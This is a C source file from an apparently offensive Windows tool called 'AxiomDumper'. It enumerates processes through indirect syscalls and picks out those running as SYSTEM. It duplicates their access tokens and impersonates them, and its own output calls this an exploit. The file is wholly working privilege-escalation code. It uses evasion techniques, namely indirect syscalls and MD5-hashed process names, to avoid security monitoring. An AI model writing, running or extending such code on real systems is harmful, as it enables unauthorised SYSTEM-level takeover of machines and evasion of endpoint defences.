#include <stdio.h>
#include <windows.h>
#include <sddl.h>

#include "AxiomDumper.h"
#include "SSN.h"
#include "SSN_Hashes.h"

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

static BOOL ImpersonateTargetToken(HANDLE hToken)
{
    HANDLE hCurrent = NtCurrentThread();
    HANDLE hDuplicate = nullptr;
    NTSTATUS status = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES ObjectAttributes;

    printf("Starting impersonation\n");
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    printf("Impersonate init ok\n");

    SECURITY_QUALITY_OF_SERVICE Qos;
    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    Qos.ImpersonationLevel = SecurityImpersonation;
    Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    Qos.EffectiveOnly = FALSE;

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = NULL;
    ObjectAttributes.ObjectName = NULL;
    ObjectAttributes.Attributes = 0;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = &Qos;

    IndirectSyscall(
        status,
        AXIOM_SSN_NtDuplicateToken,
        hToken,
        TOKEN_ALL_ACCESS,
        &ObjectAttributes,
        FALSE,
        2, //TokenImpersonation
        &hDuplicate
    );
    printf("Duplicate Complete, status = %d\n", status);
    try {
        //status = SetThreadToken(NULL, hDuplicate);
        IndirectSyscall(
            status,
            AXIOM_SSN_NtSetInformationThread,
            hCurrent,
            5, //ThreadImpersonationToken
            &hDuplicate,
            sizeof(HANDLE)
        );
        printf("Thread info complete, status = %d\n", status);
    }
    catch (...) {
        printf("[FAILURE] Could not set thread infos, skipping...\n");
        return (false);
    }

    if (NT_SUCCESS(status)) {
        printf("Impersonation success\n");
        return (true);
    }
    printf("Impersonation failed\n");
    return (false);
}


//Thank you ChatGPT lol
BOOL IsSystemProcess(HANDLE hToken, const wchar_t* procName)
{
    PSID pSystemSid;
    BOOL isSystem;
    NTSTATUS status;
    PTOKEN_USER pTokenUser;
    ULONG pTokenUserSize;

    isSystem = false;
    status = 0xC0000023;
    pTokenUser = NULL;
    pTokenUserSize = sizeof(PTOKEN_USER);
    //printf("[DEBUG] Checking if process %S is run by SYSTEM\n", procName);
    while (status == 0xC0000023 || status == 0xC0000004)
    {
        pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);
        if (!pTokenUser)
            return (false);

        IndirectSyscall(
            status,
            AXIOM_SSN_NtQueryInformationToken,
            hToken,
            TokenUser,
            pTokenUser,
            pTokenUserSize,
            &pTokenUserSize
        );
        //printf("[DEBUG] Querying token information for process %S, status = %d\n", procName, status);
    }

    if (!NT_SUCCESS(status)) {
        printf("NOPE\n");
        return (false);
    }

    ConvertStringSidToSid(L"S-1-5-18", &pSystemSid);
    isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
    printf("Comparison to SYSTEM sid complete\n");

    return (isSystem);
}

PSYSTEM_PROCESS_INFORMATION GetSysProcInfo()
{
    NTSTATUS status = STATUS_SUCCESS;
    PVOID buffer = nullptr;
    ULONG bufferSize = 0;

    IndirectSyscall(
        status,
        AXIOM_SSN_NtQuerySystemInformation,
        5, //SystemProcessInformation
        buffer,
        bufferSize,
        &bufferSize
    );
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        if (buffer) free(buffer);
        buffer = malloc(bufferSize);
        if (!buffer) {
            return nullptr;
        }
        IndirectSyscall(
            status,
            AXIOM_SSN_NtQuerySystemInformation,
            5, //SystemProcessInformation
            buffer,
            bufferSize,
            &bufferSize
        );
    }

    if (!NT_SUCCESS(status)) {
        if (buffer) free(buffer);
        return nullptr;
    }

    return (PSYSTEM_PROCESS_INFORMATION)buffer;
}

HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid)
{
    printf("Starting token duplication\n");
    PSYSTEM_PROCESS_INFORMATION sysProcInfo = GetSysProcInfo();
    printf("Proc info retrieved\n");
    const char* blacklistHashes[] = {
        "9e6327c6861bc2f2a81ad265985c62ea", //winlogon.exe
        "1c376c0c54a4c49f47cd81247d8a7f25", //csrss.exe
        "4256c618e4617cb41a0d5ef9d284cc0c", //svchost.exe
        "523dd22f0d14e91bc152b7b6ec4afd7f", //lsass.exe
        "58156177444cfc4ee4e358134203b385", //spoolsv.exe
        "bb818c62899ea414bf3c953818bb0307"  //LsaIso.exe
    };
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hProcess = nullptr;
    HANDLE hToken = nullptr;
    HANDLE hDuplicate = nullptr;

    do
    {
        printf("Inspecting process %S\n", sysProcInfo->ImageName.Buffer);
        if (sysProcInfo->ImageName.Length)
        {
            BOOL isBlacklisted = false;
            const char* imageNameHash = drunk_md5(drunk_wchar_to_cstring(sysProcInfo->ImageName.Buffer));
            for (int i = 0; i < 6; i++)
            {
                if (drunk_strcmp(blacklistHashes[i], imageNameHash) == 0)
                {
                    printf("Process %S is on blacklist, skipping...\n", sysProcInfo->ImageName.Buffer);
                    isBlacklisted = true;
                    break;
                }
            }

            if (!isBlacklisted)
            {

                CLIENT_ID clientId = { (HANDLE)sysProcInfo->UniqueProcessId, 0 };
                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

                SECURITY_QUALITY_OF_SERVICE Qos;
                Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
                Qos.ImpersonationLevel = SecurityImpersonation;
                Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
                Qos.EffectiveOnly = FALSE;

                objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
                objAttr.RootDirectory = NULL;
                objAttr.ObjectName = NULL;
                objAttr.Attributes = 0;
                objAttr.SecurityDescriptor = NULL;
                objAttr.SecurityQualityOfService = &Qos;

                IndirectSyscall(
                    status,
                    AXIOM_SSN_NtOpenProcess,
                    &hProcess,
                    PROCESS_QUERY_INFORMATION,
                    &objAttr,
                    &clientId
                );
                if (status == 0xC0000022) {
                    printf("Process %S open failed, skipping...\n", sysProcInfo->ImageName.Buffer);
                    sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                    continue;
                }
                //printf("[DEBUG] Process %S opened !\n", sysProcInfo->ImageName.Buffer);
                IndirectSyscall(
                    status,
                    AXIOM_SSN_NtOpenProcessToken,
                    hProcess,
                    TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                    &hToken
                );
                if (status == 0xC0000022) {
                    //printf("[DEBUG] Token open for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
                    sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                    continue;
                }
                //printf("[DEBUG] Token opened !\n");

                if (IsSystemProcess(hToken, sysProcInfo->ImageName.Buffer))
                {
                    //printf("[DEBUG] Process %S is run by SYSTEM, duplicating...\n", sysProcInfo->ImageName.Buffer);
                    IndirectSyscall(
                        status,
                        AXIOM_SSN_NtDuplicateToken,
                        hToken,
                        TOKEN_ALL_ACCESS,
                        &objAttr,
                        FALSE,
                        TokenPrimary,
                        &hDuplicate
                    );
                    if (status == 0xC0000022) {
                        //printf("[DEBUG] Duplication for process %S failed, skipping...\n", sysProcInfo->ImageName.Buffer);
                        sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                        continue;
                    }
                    //printf("[DEBUG] Duplication success\n", sysProcInfo->ImageName.Buffer);

                    if (ImpersonateTargetToken(hDuplicate)) {
                        printf("Privileged Token impersonated :)\n");
                        return (hDuplicate);
                    }
                    printf("[FAILURE] Trying a new duplication\n");
                    continue;
                }
                else {
                    //printf("[DEBUG] Process %S is not SYSTEM :/\n", sysProcInfo->ImageName.Buffer);
                }
            }
        }

        sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
    } while (sysProcInfo->NextEntryOffset != 0);

    printf("[FAILURE] No more duplication to try, exploit failed :(\n");
    exit(1);
}
